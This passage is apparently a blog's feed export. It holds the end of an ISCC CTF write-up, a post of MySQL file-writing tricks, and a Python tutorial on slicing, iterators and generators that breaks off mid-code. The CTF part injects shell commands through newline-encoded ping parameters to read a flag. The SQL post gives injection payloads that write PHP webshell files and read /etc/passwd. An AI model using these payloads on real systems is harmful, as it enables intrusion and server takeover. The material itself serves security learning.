&apos;&apos;,</span><br><span class="line">&apos;`&apos;  =&gt; &apos;&apos;,</span><br><span class="line">&apos;||&apos; =&gt; &apos;&apos;,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) &#123;</span><br><span class="line">// Windows</span><br><span class="line"></span><br><span class="line">$cmd = shell_exec( &apos;ping  &apos; . $target );</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// *nix</span><br><span class="line">$cmd = shell_exec( &apos;ping  -c 1 &apos; . $target );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo  &quot;</span><br><span class="line">&#123;$cmd&#125;</span><br><span class="line">&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>查看根目录<a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0als" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0als</a></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805080036_137.png" alt=""></p><p>一个一个试查看flag在哪里 发现flag在/home/flag</p><p><a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0acd%20home%0als" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0acd%20home%0als</a></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805080045_61.png" alt=""></p><p><a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0acd%20home%0acat%20flag" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0acd%20home%0acat%20flag</a></p><h3 id="php是世界上最好的语言"><a href="#php是世界上最好的语言" class="headerlink" title="php是世界上最好的语言"></a>php是世界上最好的语言</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ISCC-WP&quot;&gt;&lt;a href=&quot;#ISCC-WP&quot; class=&quot;headerlink&quot; title=&quot;ISCC WP&quot;&gt;&lt;/a&gt;ISCC WP&lt;/h1&gt;&lt;h2 id=&quot;Misc&quot;&gt;&lt;a href=&quot;#Misc&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://www.twosmi1e.com/tags/ctf/"/>
    
      <category term="wp" scheme="https://www.twosmi1e.com/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>Mysql写入文件小技巧</title>
    <link href="https://www.twosmi1e.com/2018/02/10/Mysql%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
    <id>https://www.twosmi1e.com/2018/02/10/Mysql写入文件小技巧/</id>
    <published>2018-02-10T15:03:01.000Z</published>
    <updated>2018-03-13T11:36:57.730Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-用UNION写入"><a href="#1-用UNION写入" class="headerlink" title="1.用UNION写入"></a>1.用UNION写入</h1><p>&nbsp;&nbsp;<a href="http://url/?id=1" target="_blank" rel="external">http://url/?id=1</a> and 0 union select 1,2 ,’&lt;?php phpinfo(); ?&gt;’ into dumpfile ‘文件绝对路径’<br><img src="http://t1.aixinxi.net/o_1c8fibdp316ln1hegq27nnvmeua.png-j.jpg" alt=""><br>&nbsp;&nbsp;采用常规的union写入，可以看到前面的字段占位数肯定也会被写入，替换成null也是一样的结果，这个对于写shell没啥大碍，<br>但是如果用来写bat,mof,vbs等文件就会出问题了，那么怎么去掉这个只写入我们需要的内容呢？采用hex编码就好了。<br><img src="http://t1.aixinxi.net/o_1c8fibvrb1ddf1l1p2ti16q4hu8a.png-j.jpg" alt=""><br>&nbsp;&nbsp;将我们要写入的内容使用hex编码在分段写在每个字段位上，这样就可以只写入我们需要的内容了。</p><h1 id="2-不支持union注入时-用terminated-by"><a href="#2-不支持union注入时-用terminated-by" class="headerlink" title="2.不支持union注入时 用terminated by"></a>2.不支持union注入时 用terminated by</h1><p>&nbsp;&nbsp;语法：select <em> from admin where id=1 into outfile ‘F:\WWW\phpinfo.php’ fields terminated by ‘&lt;? phpinfo(); ?&gt;’%23<br><img src="http://t1.aixinxi.net/o_1c7bt8hbmc5ev2a1tvt1gvh12jga.png-j.jpg" alt=""><br>&nbsp;&nbsp;可以看到成功写入，但是这个方法有一个弊病就是查询出来的数据必须大于或等于2以上才可以写入内容，写入的内容数=查询出来的数据-1<br>可以看到，当我们使前面的数据出错查不到数据的时候，写入是失败的。<br>看看sqlmap中的情况：<br><img src="http://t1.aixinxi.net/o_1c7btan3lvrq1f89ntd1n0562na.png-j.jpg" alt=""><br>&nbsp;&nbsp;可以很明显的看到sqlmap中也有这种办法写入。（burp抓取sqlmap数据包：加上 –proxy “<a href="http://127.0.0.1:8080/&quot;" target="_blank" rel="external">http://127.0.0.1:8080/&quot;</a>; 在burp里可以看到请求）<br><img src="http://t1.aixinxi.net/o_1c7btd46a1k5rfab1bpee9u1asoa.png-j.jpg" alt=""><br>当然可以看到也通过了常规的union写入文件。<br>同时附上一个函数exp()。通过这个函数也可以读取文件，但是写文件只能写入一个内容为0的文件，这里就必须结合其他的漏洞利用了，如：文件覆盖之类的。<br>读文件：<br>select exp(~(select</em>from(select load_file(‘/etc/passwd’))a));<br>写文件：<br>select exp(~(select*from(select ‘hello’)a)) into outfile ‘C:/out.txt’;  //但是只能写一个0进去。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;1-用UNION写入&quot;&gt;&lt;a href=&quot;#1-用UNION写入&quot; class=&quot;headerlink&quot; title=&quot;1.用UNION写入&quot;&gt;&lt;/a&gt;1.用UNION写入&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&lt;a href=&quot;http://url/?id=1&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Python高级特性</title>
    <link href="https://www.twosmi1e.com/2018/02/02/Python%E9%AB%98%E7%BA%A7%E7%89%B9%E6%80%A7/"/>
    <id>https://www.twosmi1e.com/2018/02/02/Python高级特性/</id>
    <published>2018-02-02T13:11:53.000Z</published>
    <updated>2018-04-24T08:12:37.544Z</updated>
    
    <content type="html"><![CDATA[<h1 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h1><p>取list或者tuple的部分元素<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;L = [<span class="string">'Michael'</span>, <span class="string">'Sarah'</span>, <span class="string">'Tracy'</span>, <span class="string">'Bob'</span>, <span class="string">'Jack'</span>]</span><br></pre></td></tr></table></figure></p><p>取前3个元素，应该怎么做？笨办法：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;[L[<span class="number">0</span>], L[<span class="number">1</span>], L[<span class="number">2</span>]]</span><br><span class="line">[<span class="string">'Michael'</span>, <span class="string">'Sarah'</span>, <span class="string">'Tracy'</span>]</span><br></pre></td></tr></table></figure></p><p>取前3个元素，用一行代码就可以完成切片：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;L[<span class="number">0</span>:<span class="number">3</span>]</span><br><span class="line">[<span class="string">'Michael'</span>, <span class="string">'Sarah'</span>, <span class="string">'Tracy'</span>]</span><br></pre></td></tr></table></figure></p><p>L[0:3]表示，从索引0开始取，直到索引3为止，但不包括索引3。即索引0，1，2，正好是3个元素。<br>如果第一个索引是0，还可以省略：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;L[:<span class="number">3</span>]</span><br><span class="line">[<span class="string">'Michael'</span>, <span class="string">'Sarah'</span>, <span class="string">'Tracy'</span>]</span><br></pre></td></tr></table></figure></p><p>类似的，既然Python支持L[-1]取倒数第一个元素，那么它同样支持倒数切片，试试：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;L[<span class="number">-2</span>:][<span class="string">'Bob'</span>, <span class="string">'Jack'</span>]</span><br><span class="line">&gt;&gt;&gt;L[<span class="number">-2</span>:<span class="number">-1</span>][<span class="string">'Bob'</span>]</span><br></pre></td></tr></table></figure></p><p>记住倒数第一个元素的索引是-1。</p><p>切片操作十分有用。我们先创建一个0-99的数列：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;L = list(range(<span class="number">100</span>))</span><br><span class="line">&gt;&gt;&gt;L</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, ..., <span class="number">99</span>]</span><br></pre></td></tr></table></figure></p><p>可以通过切片轻松取出某一段数列。比如前10个数：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;L[:<span class="number">10</span>]</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]</span><br></pre></td></tr></table></figure></p><p>后10个数：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;L[<span class="number">-10</span>:]</span><br></pre></td></tr></table></figure></p><p>前11-20个数：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;L[<span class="number">10</span>:<span class="number">20</span>]</span><br><span class="line">[<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>]</span><br></pre></td></tr></table></figure></p><p>前10个数，每两个取一个：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;L[:<span class="number">10</span>:<span class="number">2</span>]</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>]</span><br></pre></td></tr></table></figure></p><p>所有数，每5个取一个：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;L[::<span class="number">5</span>]</span><br><span class="line">[<span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">20</span>, <span class="number">25</span>, <span class="number">30</span>, <span class="number">35</span>, <span class="number">40</span>, <span class="number">45</span>, <span class="number">50</span>, <span class="number">55</span>, <span class="number">60</span>, <span class="number">65</span>, <span class="number">70</span>, <span class="number">75</span>, <span class="number">80</span>, <span class="number">85</span>, <span class="number">90</span>, <span class="number">95</span>]</span><br></pre></td></tr></table></figure></p><p>甚至什么都不写，只写[:]就可以原样复制一个list：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;L[:]</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, ..., <span class="number">99</span>]</span><br></pre></td></tr></table></figure></p><p>tuple也是一种list，唯一区别是tuple不可变。因此，tuple也可以用切片操作，只是操作的结果仍是tuple：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;(<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>)[:<span class="number">3</span>]</span><br><span class="line">(<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>)</span><br></pre></td></tr></table></figure></p><p>字符串’xxx’也可以看成是一种list，每个元素就是一个字符。因此，字符串也可以用切片操作，只是操作结果仍是字符串：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="string">'ABCDEFG'</span>[:<span class="number">3</span>]</span><br><span class="line"><span class="string">'ABC'</span></span><br><span class="line">&gt;&gt;&gt;<span class="string">'ABCDEFG'</span>[::<span class="number">2</span>]</span><br><span class="line"><span class="string">'ACEG'</span></span><br></pre></td></tr></table></figure></p><h1 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h1><p>如果给定一个list或tuple，我们可以通过for循环来遍历这个list或tuple，这种遍历我们称为迭代（Iteration）。<br>list这种数据类型虽然有下标，但很多其他数据类型是没有下标的，但是，只要是可迭代对象，无论有无下标，都可以迭代，比如dict就可以迭代：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;d = &#123;<span class="string">'a'</span>: <span class="number">1</span>, <span class="string">'b'</span>: <span class="number">2</span>, <span class="string">'c'</span>: <span class="number">3</span>&#125;</span><br><span class="line">&gt;&gt;&gt;<span class="keyword">for</span> key <span class="keyword">in</span> d:</span><br><span class="line"><span class="meta">... </span>    print(key)</span><br><span class="line">...</span><br><span class="line">a</span><br><span class="line">c</span><br><span class="line">b</span><br></pre></td></tr></table></figure></p><p>默认情况：dict迭代key<br><strong>for value in d.values()</strong>  迭代value<br><strong>for k, v in d.items()</strong>  同时迭代key和value<br>由于字符串也是可迭代对象，因此，也可以作用于for循环：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="keyword">for</span> ch <span class="keyword">in</span> <span class="string">'ABC'</span>:</span><br><span class="line"><span class="meta">... </span>    print(ch)</span><br><span class="line">...</span><br><span class="line">A</span><br><span class="line">B</span><br><span class="line">C</span><br></pre></td></tr></table></figure></p><p>只要作用于一个可迭代对象，for循环就可以正常运行，而我们不太关心该对象究竟是list还是其他数据类型。<br>通过collections模块的lterable类型判断<br>函数isinstance<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="keyword">from</span> collections <span class="keyword">import</span> Iterable</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sinstance(<span class="string">'abc'</span>, Iterable) <span class="comment"># str是否可迭代</span></span><br><span class="line"><span class="keyword">True</span></span><br><span class="line">&gt;&gt;&gt;isinstance([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>], Iterable) <span class="comment"># list是否可迭代</span></span><br><span class="line"><span class="keyword">True</span></span><br><span class="line">&gt;&gt;&gt;isinstance(<span class="number">123</span>, Iterable) <span class="comment"># 整数是否可迭代</span></span><br><span class="line"><span class="keyword">False</span></span><br></pre></td></tr></table></figure></p><p>如果要对list实现类似Java那样的下标循环怎么办？Python内置的enumerate函数可以把一个list变成索引-元素对，这样就可以在for循环中同时迭代索引和元素本身：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="keyword">for</span> i, value <span class="keyword">in</span> enumerate([<span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>]):</span><br><span class="line"><span class="meta">... </span>    print(i, value)</span><br><span class="line">...</span><br><span class="line"><span class="number">0</span> A</span><br><span class="line"><span class="number">1</span> B</span><br><span class="line"><span class="number">2</span> C</span><br></pre></td></tr></table></figure></p><p>上面的for循环里，同时引用了两个变量，在Python里是很常见的，比如下面的代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="keyword">for</span> x, y <span class="keyword">in</span> [(<span class="number">1</span>, <span class="number">1</span>), (<span class="number">2</span>, <span class="number">4</span>), (<span class="number">3</span>, <span class="number">9</span>)]:</span><br><span class="line"><span class="meta">... </span>    print(x, y)</span><br><span class="line">...</span><br><span class="line"><span class="number">1</span> <span class="number">12</span> <span class="number">43</span> <span class="number">9</span></span><br></pre></td></tr></table></figure></p><h1 id="列表生成式"><a href="#列表生成式" class="headerlink" title="列表生成式"></a>列表生成式</h1><p>List Comprehensions可以用来创建list的生成式<br>生成的元素 for in 范围 if 条件判断<br>要生成list [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]可以用list(range(1, 11))：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;list(range(<span class="number">1</span>, <span class="number">11</span>))</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]</span><br></pre></td></tr></table></figure></p><p>但如果要生成[1x1, 2x2, 3x3, …, 10x10]怎么做？方法一是循环：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;L = []</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">or</span> x <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">11</span>):</span><br><span class="line"><span class="meta">... </span>   L.append(x * x)</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt;L</span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">64</span>, <span class="number">81</span>, <span class="number">100</span>]</span><br></pre></td></tr></table></figure></p><p>但是循环太繁琐，而列表生成式则可以用一行语句代替循环生成上面的list：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;[x * x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">11</span>)]</span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">64</span>, <span class="number">81</span>, <span class="number">100</span>]</span><br></pre></td></tr></table></figure></p><p>写列表生成式时，把要生成的元素x * x放到前面，后面跟for循环，就可以把list创建出来，十分有用，多写几次，很快就可以熟悉这种语法。<br>for循环后面还可以加上if判断，这样我们就可以筛选出仅偶数的平方：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;[x * x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">11</span>) <span class="keyword">if</span> x % <span class="number">2</span> == <span class="number">0</span>]</span><br><span class="line">[<span class="number">4</span>, <span class="number">16</span>, <span class="number">36</span>, <span class="number">64</span>, <span class="number">100</span>]</span><br></pre></td></tr></table></figure></p><p>还可以使用两层循环，可以生成全排列：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;[m + n <span class="keyword">for</span> m <span class="keyword">in</span> <span class="string">'ABC'</span> <span class="keyword">for</span> n <span class="keyword">in</span> <span class="string">'XYZ'</span>]</span><br><span class="line">[<span class="string">'AX'</span>, <span class="string">'AY'</span>, <span class="string">'AZ'</span>, <span class="string">'BX'</span>, <span class="string">'BY'</span>, <span class="string">'BZ'</span>, <span class="string">'CX'</span>, <span class="string">'CY'</span>, <span class="string">'CZ'</span>]</span><br></pre></td></tr></table></figure></p><p>for循环可以同时使用两个甚至多个变量， 比如dict的items（）<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;d = &#123;<span class="string">'x'</span>: <span class="string">'A'</span>, <span class="string">'y'</span>: <span class="string">'B'</span>, <span class="string">'z'</span>: <span class="string">'C'</span> &#125;</span><br><span class="line">&gt;&gt;&gt;<span class="keyword">for</span> k, v <span class="keyword">in</span> d.items():</span><br><span class="line"><span class="meta">... </span>    print(k, <span class="string">'='</span>, v)</span><br><span class="line">...</span><br><span class="line">y = B</span><br><span class="line">x = A</span><br><span class="line">z = C</span><br></pre></td></tr></table></figure></p><p>同时迭代key和value<br>源码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">L1 = [<span class="string">'Hello'</span>, <span class="string">'World'</span>, <span class="number">18</span>, <span class="string">'Apple'</span>, <span class="keyword">None</span>]</span><br><span class="line">L2 = [s.lower() <span class="keyword">for</span> s <span class="keyword">in</span> L1 <span class="keyword">if</span> isinstance(s, str)]</span><br><span class="line"><span class="keyword">print</span> (L2)</span><br></pre></td></tr></table></figure></p><h1 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h1><p>generator:生成器 一边循环一边计算<br>要创建一个generator，有很多种方法。第一种方法很简单，只要把一个列表生成式的[]改成()，就创建了一个generator：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;L = [x * x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>)]</span><br><span class="line">&gt;&gt;&gt;L</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">64</span>, <span class="number">81</span>]</span><br><span class="line">&gt;&gt;&gt;g = (x * x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>))</span><br><span class="line">&gt;&gt;&gt;g</span><br><span class="line">&lt;generator object &lt;genexpr&gt; at <span class="number">0x1022ef630</span>&gt;</span><br></pre></td></tr></table></figure></p><p>创建L和g的区别仅在于最外层的[]和()，L是一个list，而g是一个generator。<br>通过next()函数获得generator的下一个返回值<br>没有更多的元素时抛出StopIteration的错误<br>要把fib函数变成generator，只需要把print(b)改为yield b就可以了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span><span class="params">(max)</span>:</span></span><br><span class="line">n, a, b = <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> n &lt; max:</span><br><span class="line"><span class="keyword">yield</span> b</span><br><span class="line">a, b = b, a + b</span><br><span class="line">n = n + <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">'done'</span></span><br></pre></td></tr></table></figure></p><p>#测试<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f = fib(<span class="number">10</span>)</span><br><span class="line">print(<span class="string">'fib(10):'</span>, f)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> f:</span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure></p><p>如果一个函数定义中包含yield关键字，则这为generator<br>generator和函数的执行流程不一样。函数是顺序执行，遇到return语句或者最后一行函数语句就返回。而变成generator的函数，在每次调用next()的时候执行，遇到yield语句返回，再次执行时从上次返回的yield语句处继续执行。</p><p>我们在循环过程中不断调用yield，就会不断中断。当然要给循环设置一个条件来退出循环，不然就会产生一个无限数列出来。<br>同样的，把函数改成generator后，我们基本上从来不会用next()来获取下一个返回值，而是直接使用for循环来迭代：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="keyword">for</span> n <span class="keyword">in</span> fib(<span class="number">6</span>):</span><br><span class="line"><span class="meta">... </span>    print(n)</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>但是用for循环调用generator时，发现拿不到generator的return语句的返回值。如果想要拿到返回值，必须捕获StopIteration错误，返回值包含在StopIteration的value中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;while True:</span><br><span class="line">...     try:</span><br><span class="line">...         x = next(g)</span><br><span class="line">...         print(&apos;g:&apos;, x)</span><br><span class="line">...     except StopIteration as e:</span><br><span class="line">...         print(&apos;Generator return value:&apos;, e.value)</span><br><span class="line">...         break</span><br></pre></td></tr></table></figure></p><p>请注意区分普通函数和generator函数，普通函数调用直接返回结果：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;r = abs(<span class="number">6</span>)</span><br><span class="line">&gt;&gt;&gt;r</span><br><span class="line"><span class="number">6</span></span><br></pre></td></tr></table></figure></p><p>generator函数的“调用”实际返回一个generator对象：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;g = fib(<span class="number">6</span>)</span><br><span class="line">&gt;&gt;&gt;g</span><br><span class="line">&lt;generator object fib at <span class="number">0x1022ef948</span>&gt;</span><br></pre></td></tr></table></figure></p><p>练习输出杨辉三角  见yanghuireiangle</p><h1 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h1><p>可作用于for的数据类型，一类为集合数据类型，一类为generator<br>统称为可迭代对象：Iterable 用 isinstance ()判断<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="keyword">from</span> collections <span class="keyword">import</span> Iterator</span><br><span class="line">&gt;&gt;&gt;isinstance((x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>)), Iterator)</span><br><span class="line"><span class="keyword">True</span></span><br><span class="line">&gt;&gt;&gt;isinstance([], Iterator)</span><br><span class="line"><span class="keyword">False</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>isinstance(&#123;&#125;, Iterator)</span><br><span class="line"><span class="keyword">False</span></span><br><span class="line">&gt;&gt;&gt;isinstance(<span class="string">'abc'</span>, Iterator)</span><br><span class="line"><span class="keyword">False</span></span><br><span class="line">把list、dict、str等Iterable变成Iterator可以使用iter()函数：</span><br><span class="line">&gt;&gt;&gt;isinstance(iter([]), Iterator)</span><br><span class="line"><span class="keyword">True</span></span><br><span class="line">&gt;&gt;&gt;isinstance(iter(<span class="string">'abc'</span>), Iterator)</span><br><span class="line"><span class="keyword">True</span></span><br></pre></td></tr></table></figure></p><p>Iterator对象表示一个数据流，不能提起知道序列的长度，其计算为惰性的，只有在需要下一个返回值的时候才会计算</p><p>可作用于for的对象都是Iterable类型<br>可作用于next()的都是Iterator类型<br>for循环本质上就是通过不断调用next()函数实现的<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]:</span><br><span class="line"><span 